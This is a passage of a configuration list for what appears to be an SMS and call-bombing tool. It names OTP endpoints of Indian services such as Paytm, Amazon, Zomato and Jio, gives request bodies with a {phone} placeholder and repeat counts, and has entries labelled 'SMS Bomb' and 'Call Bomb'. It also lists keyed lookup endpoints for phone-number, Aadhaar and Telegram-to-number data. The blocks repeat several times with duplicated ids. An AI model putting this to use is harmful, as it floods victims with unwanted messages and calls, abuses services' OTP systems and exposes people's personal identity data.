      "count": 5
    },
    {
      "id": 5,
      "name": "Zomato SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.zomato.com/php/oauth_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 6,
      "name": "Ola SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/authentication/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 7,
      "name": "Uber SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://auth.uber.com/v2/oauth/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "+91{phone}" },
      "count": 5
    },
    {
      "id": 8,
      "name": "Airtel SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.airtel.in/thanks/api/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 5
    },
    {
      "id": 9,
      "name": "Jio SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.jio.com/api/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 10,
      "name": "Myntra SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 11,
      "name": "BigBasket SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.bigbasket.com/auth/otp/login/",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 12,
      "name": "Netflix SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.netflix.com/in/login/help",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 13,
      "name": "Hotstar SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 14,
      "name": "Meesho SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.meesho.com/api/v2/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 15,
      "name": "CRED SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.cred.club/api/v1/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    
    // ============ CALL APIs (WORKING) ============
    {
      "id": 16,
      "name": "PhonePe Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.phonepe.com/api/v2/otp/voice",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}", "type": "voice" },
      "count": 3
    },
    {
      "id": 17,
      "name": "Paytm Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://accounts.paytm.com/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}", "channel": "voice" },
      "count": 3
    },
    {
      "id": 18,
      "name": "Google Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.google.com/voice/b/0/service/post",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber=%2B91{phone}&type=voice",
      "count": 3
    },
    {
      "id": 19,
      "name": "Amazon Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.amazon.in/ap/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "{phone}" },
      "count": 3
    },
    {
      "id": 20,
      "name": "Flipkart Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 3
    },
    {
      "id": 21,
      "name": "Swiggy Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.swiggy.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 3
    },
    {
      "id": 22,
      "name": "Zomato Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.zomato.com/php/voice_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 3
    },
    {
      "id": 23,
      "name": "Ola Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 24,
      "name": "Uber Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://auth.uber.com/v2/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 25,
      "name": "Airtel Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.airtel.in/voice/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 3
    },
    {
      "id": 26,
      "name": "Jio Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.jio.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    {
      "id": 27,
      "name": "Myntra Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.myntra.com/gw/voice/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    
    // ============ DATA APIS (BACKUP) ============
    {
      "id": 28,
      "name": "Number Info API",
      "type": "Data",
      "method": "GET",
      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 29,
      "name": "Aadhar Lookup",
      "type": "Data",
      "method": "GET",
      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 30,
      "name": "Telegram to Number",
      "type": "Data",
      "method": "GET",
      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
      "headers": {},
      "count": 1
    },
        {
      "id": 4,
      "name": "SMS Bomb - Service 1",
      "type": "SMS",
      "method": "POST",
      "url": "https://example1.com/api/send",
      "headers": {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
      },
      "body": {
        "phone": "{phone}",
        "message": "OTP: 123456"
      },
      "count": 2
    },
    {
      "id": 5,
      "name": "SMS Bomb - Service 2",
      "type": "SMS",
      "method": "POST",
      "url": "https://example2.com/api/otp",
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "body": "mobile={phone}&service=login",
      "count": 3
    },
    {
      "id": 6,
      "name": "Call Bomb - Service 1",
      "type": "Call",
      "method": "POST",
      "url": "https://callapi1.com/call",
      "headers": {},
      "body": {
        "phone": "{phone}"
      },
      "count": 1
    },
    // ============ SMS APIs (WORKING) ============
    {
      "id": 1,
      "name": "Paytm SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://accounts.paytm.com/signin/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 2,
      "name": "Flipkart SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/signup/status",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 5
    },
    {
      "id": 3,
      "name": "Amazon SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.amazon.in/ap/register",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 4,
      "name": "Swiggy SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.swiggy.com/api/auth/signup",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 5,
      "name": "Zomato SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.zomato.com/php/oauth_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 6,
      "name": "Ola SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/authentication/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 7,
      "name": "Uber SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://auth.uber.com/v2/oauth/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "+91{phone}" },
      "count": 5
    },
    {
      "id": 8,
      "name": "Airtel SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.airtel.in/thanks/api/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 5
    },
    {
      "id": 9,
      "name": "Jio SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.jio.com/api/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 10,
      "name": "Myntra SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 11,
      "name": "BigBasket SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.bigbasket.com/auth/otp/login/",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 12,
      "name": "Netflix SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.netflix.com/in/login/help",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 13,
      "name": "Hotstar SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 14,
      "name": "Meesho SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.meesho.com/api/v2/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 15,
      "name": "CRED SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.cred.club/api/v1/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    
    // ============ CALL APIs (WORKING) ============
    {
      "id": 16,
      "name": "PhonePe Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.phonepe.com/api/v2/otp/voice",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}", "type": "voice" },
      "count": 3
    },
    {
      "id": 17,
      "name": "Paytm Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://accounts.paytm.com/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}", "channel": "voice" },
      "count": 3
    },
    {
      "id": 18,
      "name": "Google Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.google.com/voice/b/0/service/post",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber=%2B91{phone}&type=voice",
      "count": 3
    },
    {
      "id": 19,
      "name": "Amazon Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.amazon.in/ap/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "{phone}" },
      "count": 3
    },
    {
      "id": 20,
      "name": "Flipkart Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 3
    },
    {
      "id": 21,
      "name": "Swiggy Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.swiggy.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 3
    },
    {
      "id": 22,
      "name": "Zomato Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.zomato.com/php/voice_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 3
    },
    {
      "id": 23,
      "name": "Ola Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 24,
      "name": "Uber Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://auth.uber.com/v2/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 25,
      "name": "Airtel Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.airtel.in/voice/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 3
    },
    {
      "id": 26,
      "name": "Jio Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.jio.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    {
      "id": 27,
      "name": "Myntra Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.myntra.com/gw/voice/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    
    // ============ DATA APIS (BACKUP) ============
    {
      "id": 28,
      "name": "Number Info API",
      "type": "Data",
      "method": "GET",
      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 29,
      "name": "Aadhar Lookup",
      "type": "Data",
      "method": "GET",
      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 30,
      "name": "Telegram to Number",
      "type": "Data",
      "method": "GET",
      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
      "headers": {},
      "count": 1
    },
        {
      "id": 4,
      "name": "SMS Bomb - Service 1",
      "type": "SMS",
      "method": "POST",
      "url": "https://example1.com/api/send",
      "headers": {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
      },
      "body": {
        "phone": "{phone}",
        "message": "OTP: 123456"
      },
      "count": 2
    },
    {
      "id": 5,
      "name": "SMS Bomb - Service 2",
      "type": "SMS",
      "method": "POST",
      "url": "https://example2.com/api/otp",
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "body": "mobile={phone}&service=login",
      "count": 3
    },
    {
      "id": 6,
      "name": "Call Bomb - Service 1",
      "type": "Call",
      "method": "POST",
      "url": "https://callapi1.com/call",
      "headers": {},
      "body": {
        "phone": "{phone}"
      },
      "count": 1
    },
    // ============ SMS APIs (WORKING) ============
    {
      "id": 1,
      "name": "Paytm SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://accounts.paytm.com/signin/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 2,
      "name": "Flipkart SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/signup/status",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 5
    },
    {
      "id": 3,
      "name": "Amazon SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.amazon.in/ap/register",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 4,
      "name": "Swiggy SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.swiggy.com/api/auth/signup",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 5,
      "name": "Zomato SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.zomato.com/php/oauth_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 6,
      "name": "Ola SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/authentication/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 7,
      "name": "Uber SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://auth.uber.com/v2/oauth/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "+91{phone}" },
      "count": 5
    },
    {
      "id": 8,
      "name": "Airtel SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.airtel.in/thanks/api/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 5
    },
    {
      "id": 9,
      "name": "Jio SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.jio.com/api/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 10,
      "name": "Myntra SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 11,
      "name": "BigBasket SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.bigbasket.com/auth/otp/login/",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 12,
      "name": "Netflix SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.netflix.com/in/login/help",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 13,
      "name": "Hotstar SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 14,
      "name": "Meesho SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.meesho.com/api/v2/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 15,
      "name": "CRED SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.cred.club/api/v1/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    
    // ============ CALL APIs (WORKING) ============
    {
      "id": 16,
      "name": "PhonePe Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.phonepe.com/api/v2/otp/voice",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}", "type": "voice" },
      "count": 3
    },
    {
      "id": 17,
      "name": "Paytm Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://accounts.paytm.com/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}", "channel": "voice" },
      "count": 3
    },
    {
      "id": 18,
      "name": "Google Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.google.com/voice/b/0/service/post",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber=%2B91{phone}&type=voice",
      "count": 3
    },
    {
      "id": 19,
      "name": "Amazon Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.amazon.in/ap/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "{phone}" },
      "count": 3
    },
    {
      "id": 20,
      "name": "Flipkart Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 3
    },
    {
      "id": 21,
      "name": "Swiggy Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.swiggy.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 3
    },
    {
      "id": 22,
      "name": "Zomato Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.zomato.com/php/voice_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 3
    },
    {
      "id": 23,
      "name": "Ola Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 24,
      "name": "Uber Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://auth.uber.com/v2/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 25,
      "name": "Airtel Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.airtel.in/voice/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 3
    },
    {
      "id": 26,
      "name": "Jio Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.jio.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    {
      "id": 27,
      "name": "Myntra Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.myntra.com/gw/voice/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    
    // ============ DATA APIS (BACKUP) ============
    {
      "id": 28,
      "name": "Number Info API",
      "type": "Data",
      "method": "GET",
      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 29,
      "name": "Aadhar Lookup",
      "type": "Data",
      "method": "GET",
      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 30,
      "name": "Telegram to Number",
      "type": "Data",
      "method": "GET",
      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
      "headers": {},
      "count": 1
    },
        {
      "id": 4,
      "name": "SMS Bomb - Service 1",
      "type": "SMS",
      "method": "POST",
      "url": "https://example1.com/api/send",
      "headers": {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
      },
      "body": {
        "phone": "{phone}",
        "message": "OTP: 123456"
      },
      "count": 2
    },
    {
      "id": 5,
      "name": "SMS Bomb - Service 2",
      "type": "SMS",
      "method": "POST",
      "url": "https://example2.com/api/otp",
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "body": "mobile={phone}&service=login",
      "count": 3
    },
    {
      "id": 6,
      "name": "Call Bomb - Service 1",
      "type": "Call",
      "method": "POST",
      "url": "https://callapi1.com/call",
      "headers": {},
      "body": {
        "phone": "{phone}"
      },
      "count": 1
    },
    // ============ SMS APIs (WORKING) ============
    {
      "id": 1,
      "name": "Paytm SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://accounts.paytm.com/signin/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 2,
      "name": "Flipkart SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/signup/status",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 5
    },
    {
      "id": 3,
      "name": "Amazon SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.amazon.in/ap/register",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 4,
      "name": "Swiggy SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.swiggy.com/api/auth/signup",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 5,
      "name": "Zomato SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.zomato.com/php/oauth_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 6,
      "name": "Ola SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/authentication/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 7,
      "name": "Uber SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://auth.uber.com/v2/oauth/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "+91{phone}" },
      "count": 5
    },
    {
      "id": 8,
      "name": "Airtel SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.airtel.in/thanks/api/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 5
    },
    {
      "id": 9,
      "name": "Jio SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.jio.com/api/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 10,
      "name": "Myntra SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 11,
      "name": "BigBasket SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.bigbasket.com/auth/otp/login/",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 12,
      "name": "Netflix SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.netflix.com/in/login/help",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 13,
      "name": "Hotstar SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 14,
      "name": "Meesho SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.meesho.com/api/v2/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 15,
      "name": "CRED SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.cred.club/api/v1/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    
    // ============ CALL APIs (WORKING) ============
    {
      "id": 16,
      "name": "PhonePe Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.phonepe.com/api/v2/otp/voice",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}", "type": "voice" },
      "count": 3
    },
    {
      "id": 17,
      "name": "Paytm Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://accounts.paytm.com/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}", "channel": "voice" },
      "count": 3
    },
    {
      "id": 18,
      "name": "Google Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.google.com/voice/b/0/service/post",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber=%2B91{phone}&type=voice",
      "count": 3
    },
    {
      "id": 19,
      "name": "Amazon Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.amazon.in/ap/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "{phone}" },
      "count": 3
    },
    {
      "id": 20,
      "name": "Flipkart Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 3
    },
    {
      "id": 21,
      "name": "Swiggy Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.swiggy.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 3
    },
    {
      "id": 22,
      "name": "Zomato Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.zomato.com/php/voice_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 3
    },
    {
      "id": 23,
      "name": "Ola Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 24,
      "name": "Uber Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://auth.uber.com/v2/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 25,
      "name": "Airtel Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.airtel.in/voice/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 3
    },
    {
      "id": 26,
      "name": "Jio Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.jio.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    {
      "id": 27,
      "name": "Myntra Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.myntra.com/gw/voice/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    
    // ============ DATA APIS (BACKUP) ============
    {
      "id": 28,
      "name": "Number Info API",
      "type": "Data",
      "method": "GET",
